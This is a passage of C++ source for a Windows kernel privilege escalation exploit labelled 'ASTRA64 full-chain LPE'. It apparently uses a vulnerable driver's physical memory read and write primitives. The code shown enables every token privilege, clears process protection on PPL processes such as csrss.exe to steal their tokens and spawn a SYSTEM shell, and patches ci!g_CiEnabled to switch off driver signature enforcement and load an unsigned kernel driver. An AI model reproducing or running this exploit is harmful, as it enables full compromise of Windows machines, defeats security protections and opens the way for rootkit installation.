    printf("[*] Present = 0x%016llX\n",(ULONGLONG)old_p);
    printf("[*] Enabled = 0x%016llX\n",(ULONGLONG)old_e);

    k.drv.write_u64(pa_present,0xFFFFFFFFFFFFFFFF);
    k.drv.write_u64(pa_enabled,0xFFFFFFFFFFFFFFFF);
    printf("[+] All 64 privileges enabled\n");

    spawn_shell();
    Sleep(1000);
    k.drv.write_u64(pa_present,old_p);
    k.drv.write_u64(pa_enabled,old_e);
    printf("[+] Privileges restored\n");
    return 0;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Technique 3: PPL bypass via EPROCESS.Protection clear
// ═══════════════════════════════════════════════════════════════════════════════

static int run_ppl(const char* target_name){
    printf("\n=== Technique 3: PPL Bypass (target: %s) ===\n", target_name);
    KernelCtx k; if(!kctx_init(&k)) return 1;
    if(!do_token_swap(&k)){printf("[-] Need SYSTEM token first\n");return 1;}
    printf("[+] Now SYSTEM\n");

    auto ppl_list = find_ppl_processes(&k.drv, k.cr3, k.off);
    if(ppl_list.empty()){printf("[-] No PPL processes found\n");restore_token(&k);return 1;}

    auto prot_str=[](uint8_t p)->const char*{
        static char buf[32];
        const char *t[]={"None","PPL","PP","??"},*s[]={"None","Authenticode","CodeGen","Antimalware","Lsa","Windows","WinTcb","WinSystem"};
        sprintf_s(buf,"%s-%s(0x%02X)",t[p&7<4?p&7:3],s[(p>>4)<8?(p>>4):0],p);return buf;
    };

    printf("\n[*] PPL processes:\n");
    for(auto&e:ppl_list) printf("    PID %5u  %-20s  %s\n",e.pid,e.name,prot_str(e.prot));

    PplEntry *target=nullptr;
    for(auto&e:ppl_list) if(_stricmp(e.name,target_name)==0){target=&e;break;}
    if(!target){
        const char*skip[]={"System","smss.exe"};
        for(auto&e:ppl_list){
            bool ok=true; for(auto s:skip)if(_stricmp(e.name,s)==0)ok=false;
            if(ok){target=&e;break;}
        }
    }
    if(!target){printf("[-] '%s' not in PPL list\n",target_name);restore_token(&k);return 1;}
    printf("\n[*] Target: %s PID=%u Protection=%s\n",target->name,target->pid,prot_str(target->prot));

    // Patch: clear Protection byte
    uint64_t prot_pa=0;
    if(!virt_to_phys(&k.drv,k.cr3,target->ep_va+k.off.eprocess_Protection,&prot_pa)){
        printf("[-] Cannot translate Protection\n");restore_token(&k);return 1;
    }
    uint8_t orig_prot=target->prot;
    k.drv.write_u8(prot_pa,0x00);
    printf("[+] Protection cleared\n");

    HANDLE hProc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,target->pid);
    if(!hProc){
        printf("[-] OpenProcess failed: %lu\n",GetLastError());
        k.drv.write_u8(prot_pa,orig_prot); restore_token(&k); return 1;
    }
    printf("[+] OpenProcess(PID %u) success\n",target->pid);

    HANDLE hTok=NULL, hNew=NULL;
    OpenProcessToken(hProc,TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_ASSIGN_PRIMARY,&hTok);
    if(hTok){ DuplicateTokenEx(hTok,TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,TokenPrimary,&hNew); CloseHandle(hTok); }

    k.drv.write_u8(prot_pa,orig_prot);
    printf("[+] Protection restored\n");
    CloseHandle(hProc);

    if(hNew){
        STARTUPINFOW si={sizeof(si)}; PROCESS_INFORMATION pi={};
        wchar_t cmd[]=L"cmd.exe";
        if(CreateProcessWithTokenW(hNew,LOGON_WITH_PROFILE,NULL,cmd,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi)){
            printf("[+] Shell from %s token (PID %lu)\n",target->name,pi.dwProcessId);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
        CloseHandle(hNew);
    }
    Sleep(2000); restore_token(&k); return 0;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Technique 4: DSE bypass via ci!g_CiEnabled patch
// ═══════════════════════════════════════════════════════════════════════════════

static int run_dse(const char* drv_path){
    printf("\n=== Technique 4: DSE Bypass ===\n");
    printf("[*] Driver: %s\n", drv_path);

    KernelCtx k; if(!kctx_init(&k)) return 1;

    // Find ci.dll base via EnumDeviceDrivers
    LPVOID drivers[1024]; DWORD cbNeeded=0;
    EnumDeviceDrivers(drivers,sizeof(drivers),&cbNeeded);
    DWORD cnt=cbNeeded/sizeof(LPVOID);
    uint64_t ci_kbase=0;
    for(DWORD i=0;i<cnt;i++){
        char name[64]={};
        GetDeviceDriverBaseNameA(drivers[i],name,sizeof(name));
        if(_stricmp(name,"ci.dll")==0){ci_kbase=(uint64_t)(uintptr_t)drivers[i];break;}
    }
    if(!ci_kbase){printf("[-] ci.dll not found\n");return 1;}
    printf("[+] ci.dll kbase = 0x%llX\n",(ULONGLONG)ci_kbase);

    // Load ci.dll from disk to scan CiInitialize export
    HMODULE ci_disk=(HMODULE)LoadLibraryExA("ci.dll",NULL,DONT_RESOLVE_DLL_REFERENCES);
    if(!ci_disk){printf("[-] LoadLibraryEx ci.dll: %lu\n",GetLastError());return 1;}

    FARPROC ci_fn=GetProcAddress(ci_disk,"CiInitialize");
    if(!ci_fn){printf("[-] CiInitialize not exported\n");FreeLibrary(ci_disk);return 1;}
    uint64_t ci_fn_rva=(uint64_t)((uintptr_t)ci_fn-(uintptr_t)ci_disk);
    printf("[*] CiInitialize RVA = 0x%llX\n",(ULONGLONG)ci_fn_rva);

    // Scan for MOV [RIP+disp32], reg32  (89 ?5 xx xx xx xx)
    auto fn=(const uint8_t*)ci_fn;
    uint64_t gci_rva=0;
    for(size_t i=0;i<0x2000-6;i++){
        if(fn[i]!=0x89) continue;
        if((fn[i+1]&0xC7)!=0x05) continue;
        int32_t disp; memcpy(&disp,fn+i+2,4);
        uint64_t tgt_rva=(uint64_t)((int64_t)(ci_fn_rva+i+6)+disp);
        if(tgt_rva<0x8000||tgt_rva>0x400000) continue;
        uint8_t cur=*(uint8_t*)((uintptr_t)ci_disk+tgt_rva);
        printf("[*] Candidate +0x%zX: RVA=0x%llX disk_val=%u\n",i,(ULONGLONG)tgt_rva,cur);
        gci_rva=tgt_rva; break;
    }
    FreeLibrary(ci_disk);
    if(!gci_rva){printf("[-] g_CiEnabled pattern not found\n");return 1;}

    uint64_t gci_va=ci_kbase+gci_rva;
    printf("[+] g_CiEnabled VA = 0x%llX\n",(ULONGLONG)gci_va);

    uint64_t gci_pa=0;
    if(!virt_to_phys(&k.drv,k.cr3,gci_va,&gci_pa)){printf("[-] virt_to_phys g_CiEnabled\n");return 1;}

    uint32_t orig=0; k.drv.read_u32(gci_pa,&orig);
    printf("[+] g_CiEnabled = %u (DSE %s)\n",orig,orig?"ON":"OFF");

    k.drv.write_u32(gci_pa,0);
    uint32_t check=0; k.drv.read_u32(gci_pa,&check);
    printf("[+] g_CiEnabled patched -> %u\n",check);
    if(check!=0){printf("[-] Patch failed\n");return 1;}

    // Load driver via SCM
    SC_HANDLE mgr=OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    SC_HANDLE svc=OpenServiceA(mgr,DSE_DRIVER_SVC,SERVICE_ALL_ACCESS);
    if(svc){DeleteService(svc);CloseServiceHandle(svc);}
    svc=CreateServiceA(mgr,DSE_DRIVER_SVC,DSE_DRIVER_SVC,SERVICE_ALL_ACCESS,
                       SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,SERVICE_ERROR_IGNORE,
                       drv_path,NULL,NULL,NULL,NULL,NULL);
    bool loaded=false;
    if(svc){
        loaded=StartService(svc,0,NULL)||GetLastError()==ERROR_SERVICE_ALREADY_RUNNING;
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(mgr);

    k.drv.write_u32(gci_pa,orig);
    k.drv.read_u32(gci_pa,&check);
    printf("[+] g_CiEnabled restored -> %u (DSE %s)\n",check,check?"ON":"OFF");

    if(!loaded){printf("[-] Driver load failed: %lu\n",GetLastError());return 1;}
    printf("[+] Driver '%s' loaded!\n",DSE_DRIVER_SVC);
    printf("    Stop: sc stop %s && sc delete %s\n",DSE_DRIVER_SVC,DSE_DRIVER_SVC);
    return 0;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  main
// ═══════════════════════════════════════════════════════════════════════════════

int main(int argc, char** argv){
    printf("\n  [~] ASTRA64 full-chain LPE — dynamic PDB offsets\n\n");

    if(argc>=2&&_stricmp(argv[1],"priv" )==0) return run_priv();
    if(argc>=2&&_stricmp(argv[1],"ppl"  )==0){
        return run_ppl(argc>=3?argv[2]:"csrss.exe");
    }
    if(argc>=2&&_stricmp(argv[1],"dse"  )==0){
        return run_dse(argc>=3?argv[2]:DSE_DRIVER_PATH);
    }
    // default / "token"
    return run_token();
}
